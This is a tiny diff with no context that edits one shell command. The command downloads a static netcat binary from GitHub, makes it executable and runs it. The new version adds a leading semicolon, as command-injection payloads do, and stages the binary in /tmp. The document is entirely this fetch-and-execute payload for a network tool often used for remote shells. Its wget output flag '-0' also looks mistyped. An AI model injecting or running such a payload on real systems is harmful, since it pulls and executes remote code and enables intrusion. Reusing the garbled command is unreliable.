@@ -1,2 +1,2 @@
-wget https://github.com/yunchih/static-binaries/raw/master/nc; chmod +x nc; ./nc -V
+;wget https://github.com/yunchih/static-binaries/raw/master/nc -0 /tmp/nc;chmod +x /tmp/nc;/tmp/nc -V
 
